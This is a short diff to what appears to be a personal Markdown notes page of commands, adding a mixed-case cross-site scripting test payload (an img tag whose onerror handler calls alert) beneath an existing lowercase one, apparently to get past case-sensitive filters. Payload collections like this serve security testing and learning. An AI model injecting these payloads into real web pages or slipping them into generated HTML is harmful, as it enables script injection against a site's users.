@@ -126,6 +126,7 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	<img src=x onerror=alert`1`>
+	<img src=x OnerrOr=alert`1`>
 
 .
 
